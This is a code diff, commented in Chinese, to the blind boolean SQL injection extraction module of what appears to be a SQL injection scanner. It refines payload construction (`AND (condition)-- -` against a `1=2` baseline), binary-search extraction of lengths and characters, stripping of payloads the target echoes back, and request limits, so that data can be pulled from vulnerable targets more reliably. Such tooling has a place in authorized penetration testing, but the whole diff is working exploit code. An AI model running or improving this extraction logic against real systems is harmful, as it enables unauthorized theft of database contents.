@@ -15,6 +15,8 @@ import {
   LEN_FN, SUB_FN, ASCII_FN, VERSION_EXPR, TIME_COND,
 } from './extractionMaps.js';
 import { buildDynamicSimilarFn } from './Detector.js';
+import { binaryProbe } from './binaryProbe.js';
+import { responseSkeleton, stripEchoedPayload } from './echoStrip.js';
 
   // ===== 盲注二分提取（兜底） =====
 
@@ -176,7 +178,7 @@ export async function extractBoolean(ex, ctx, expr) {
         continue;
       }
       // [P0-FIX] false 基准即基线样本：喂给动态块判定器
-      judge.observe(falseResp?.data);
+      judge.observe(falseResp?.data, reqs[reqs.length - 1]);
       const falseData = String(falseResp?.data ?? '');
       for (let k = 0; k < batch.length; k++) {
         const s = batch[k];
@@ -191,7 +193,7 @@ export async function extractBoolean(ex, ctx, expr) {
           continue;
         }
         // [P0-FIX] 判定走动态块感知通道：动态页下「与 false 基准仅动态块差异」不再误判为真
-        const ok = judge.truthy(resp, falseData);
+        const ok = judge.truthy(resp, falseData, reqs[k]);
         // —— 字符类探测阶段（charset 收窄）：命中则收窄区间，未命中试下一类 / 回退全区间 ——
         if (s.phase === 'cls-digits' || s.phase === 'cls-lower') {
           if (ok) {
@@ -272,6 +274,11 @@ async function _sendBatch(ex, ctx, values) {
     let cursor = 0;
     const worker = async () => {
       while (cursor < values.length) {
+        // [P1-FIX 2026-09-17] 请求已达上限（--max-requests）→ 立即停止本批。
+        // 不检这一点的话：上限错误在 Extractor._send 被统一吞成 null，worker 会继续
+        // 全速调用，每次都在发送前被拒又立刻重试 —— 实测空转 327,875 次 / 33 秒 CPU，
+        // 且把 validity 污染成 unreachable（目标实际完全可达）。上限是终止信号，不是单点失败。
+        if (/** @type {any} */ (ex)._limitHit) break;
         const i = cursor++;
         out[i] = await ex._send(ctx, values[i]);
       }
@@ -304,24 +311,44 @@ function _dynJudge(ex, ctx) {
       similar = buildDynamicSimilarFn(baselines);
       return similar;
     };
+    // [P1-FIX 2026-09-17] 判定前的「回显剔除」集中在**这里**做，而不是每个调用点各自处理。
+    // 原因：目标是「SQL 报错/查询都返回 200 且把 SQL 原样回显」时，
+    // 真条件与 1=2 基准的响应文本**必然不同**（SQL 里的条件不同）→ `data !== falseData`
+    // 结构性恒真 → 二分与逐字符提取全部失去方向。
+    // 实测（e2e/blackbox-lab）：n=0 的响应 224 字节 vs n=127 的 226 字节，差的正是
+    // `0` 与 `127` 的位数差 —— 剔除回显后两侧应完全一致（真差异只在"有结果/无结果"那部分）。
+    // ⚠️ 之所以放这里：此前在 `_binarySearch` 单独改过一次，但 `_extendLength` 的预检与
+    //    `extractBoolean` 的字符判定是**另外两条路径**，各自都漏 → 说明"逐点记得清洗"注定漏。
+    //    集中到 judge 后，**所有判定点一次覆盖**，将来新增判定点也自动生效。
+    const clean = (s, payload) => stripEchoedPayload(String(s ?? ''), payload);
     return {
-      /** 每批探测后记录一次 false 基准响应体（去重，≤3 条） */
-      observe(data) {
-        const s = String(data ?? '');
+      /**
+       * 每批探测后记录一次 false 基准响应体（去重，≤3 条）
+       * @param {any} data false 基准响应体
+       * @param {string} [payload] 该响应对应的本条 payload（用于剔除回显）
+       */
+      observe(data, payload) {
+        const s = clean(data, payload);
         if (baselines.length < 3 && !baselines.includes(s)) {
           baselines.push(s);
           ensureSimilar();
         }
       },
-      /** true=条件成立（响应偏离 false 基准）；false=与基准一致 */
-      truthy(resp, falseData) {
-        const data = String(resp?.data ?? '');
+      /**
+       * true=条件成立（响应偏离 false 基准）；false=与基准一致
+       * @param {any} resp 真条件响应
+       * @param {any} falseData 基准响应体
+       * @param {string} [payload] 本条 payload（用于剔除回显，缺失则按原文本比较）
+       */
+      truthy(resp, falseData, payload) {
+        const data = clean(resp?.data, payload);
+        const fd = clean(falseData, payload);
         const sim = ensureSimilar();
         if (sim) {
           // 与任一 false 基准「动态块排除后相似」→ 判假；都不相似 → 判真
           return !baselines.some((b) => sim(data, b));
         }
-        return data !== String(falseData ?? '');
+        return data !== fd;
       },
     };
   }
@@ -333,28 +360,43 @@ function _dynJudge(ex, ctx) {
 /** @param {any} ex @param {object} ctx @param {any} base @param {any} makeCond @param {any} range */
 async function _binarySearch(ex, ctx, base, makeCond, range = {}) {
     const judge = _dynJudge(ex, ctx);
-    const test = async (cmp) => {
-      const [rTrue, rFalse] = await _sendBatch(ex, ctx, [
-        `${base} AND (${makeCond(cmp)})-- -`,
-        `${base} AND (1=2)-- -`,
-      ]);
-      if (rFalse) judge.observe(rFalse?.data);
-      return judge.truthy(rTrue, rFalse?.data);
+    // [P1-FIX 2026-09-17] 二分逻辑交给 binaryProbe（与列数探测共用判据组合）。
+    // 原实现只有 judge.truthy 一条判据：目标恒 200 + 错误页回显时它恒判「真」，
+    // 长度二分一路打到上界（实测顶到 65531）→ 一个 5 字符的值要提 6.5 万字符 → 超时。
+    // （同类问题此前出现过一次：动态页下同样恒真 —— 见上方 [P0-FIX] 注释。）
+    //
+    // ⚠️ direction:'lt' 不能省：本函数的判据是 `x > mid`，
+    //    判据为「真」意味着 **mid 偏小** ⇒ 应抬高下界；
+    //    而 binaryProbe 默认的 'gt' 语义是「判据为真 ⇒ 结果偏大 ⇒ 收缩上界」——
+    //    两者方向相反，直接用默认值会把二分倒着跑（实测一次挂掉 21 个用例）。
+    const probe = async (n) => {
+      const payload = `${base} AND (${makeCond(`>${n}`)})-- -`;
+      const [rTrue, rFalse] = await _sendBatch(ex, ctx, [payload, `${base} AND (1=2)-- -`]);
+      // [P1-FIX 2026-09-17] 判定前先剔除「响应中回显的本条 payload」。
+      // 目标把 SQL 原样回显时，真/假两侧的响应文本必然不同（SQL 里的条件不同），
+      // 于是 judge.truthy 的 `data !== falseData` **恒为真** → 长度二分失去方向、一路顶到上界。
+      // 实测：n=0 的响应 224 字节 vs n=127 的 226 字节，差的正是 `0` 与 `127` 的位数 ——
+      // 剔除回显后两者应完全一致（真正的差异只在有结果/无结果那部分）。
+      if (rFalse) judge.observe(rFalse?.data, payload);
+      return {
+        status: 200,
+        data: String(rTrue?.data ?? ''),
+        truthy: judge.truthy(rTrue, rFalse?.data, payload),
+      };
     };
-    let lo = range.lo ?? 0;
-    let hi = range.hi ?? 255;
-    let found = -1;
-    while (lo <= hi) {
-      const mid = Math.floor((lo + hi) / 2);
-      const ok = await test(`>${mid}`);
-      if (ok) {
-        found = mid;
-        lo = mid + 1;
-      } else {
-        hi = mid - 1;
-      }
-    }
-    return found + 1;
+    const r = await binaryProbe(probe, {
+      lo: range.lo ?? 0,
+      hi: range.hi ?? 255,
+      direction: 'lt',
+      judge: (res) => Boolean(res && res.truthy),
+      shape: (res) => responseSkeleton(String((res && res.data) || '')),
+      // 取基准用的「必真点」：x > 0 对任何非空值都成立。
+      // 不能沿用默认的区间端点 —— 延伸段的 lo=256 在真实长度 5 时判据为「假」，
+      // 两端都假会导致骨架相同、备份判据自动禁用（实测：黑盒提取链因此仍超时）。
+      shapeTrueAt: 0,
+    });
+    // 语义保持：返回「使条件成立的最大值 + 1」（全假 → 0）
+    return r.n + 1;
   }
 
   // [P2-FIX 长度上界延伸] 长度二分撞到 255 上界时，探测真实长度是否 >255（原实现静默截断）：
@@ -362,15 +404,15 @@ async function _binarySearch(ex, ctx, base, makeCond, range = {}) {
   // blindMaxLen 可配（config.blindMaxLen，默认 65535），防超长值无限拉取。
 /** @param {any} ex @param {object} ctx @param {any} base @param {any} lenExpr @param {any} current */
 async function _extendLength(ex, ctx, base, lenExpr, current) {
-    const maxLen = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 65535;
+    // [P1-FIX 2026-09-17] 默认上界 65535 → 4096：单字段超过 4K 字符属异常，
+  // 拿 65531 去逐字节提取会把一次扫描拖成十几分钟（实测）。真需要更长时用 blindMaxLen 显式放大。
+  const maxLen = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 4096;
     if (current < 255 || maxLen <= 255) return current;
     const judge = _dynJudge(ex, ctx);
-    const [rTrue, rFalse] = await _sendBatch(ex, ctx, [
-      `${base} AND (${lenExpr}>255)-- -`,
-      `${base} AND (1=2)-- -`,
-    ]);
-    if (rFalse) judge.observe(rFalse?.data);
-    if (!judge.truthy(rTrue, rFalse?.data)) return current; // 真实长度恰为 255
+    const probe255 = `${base} AND (${lenExpr}>255)-- -`;
+    const [rTrue, rFalse] = await _sendBatch(ex, ctx, [probe255, `${base} AND (1=2)-- -`]);
+    if (rFalse) judge.observe(rFalse?.data, probe255);
+    if (!judge.truthy(rTrue, rFalse?.data, probe255)) return current; // 真实长度恰为 255
     const ext = await _binarySearch(ex, ctx, base, (cmp) => `(${lenExpr})${cmp}`, { lo: 256, hi: maxLen });
     // 真实长度 ≥ maxLen 时二分会溢出返回 maxLen+1 → 钳位（提取前 maxLen 字节）
     return Math.min(ext, maxLen);
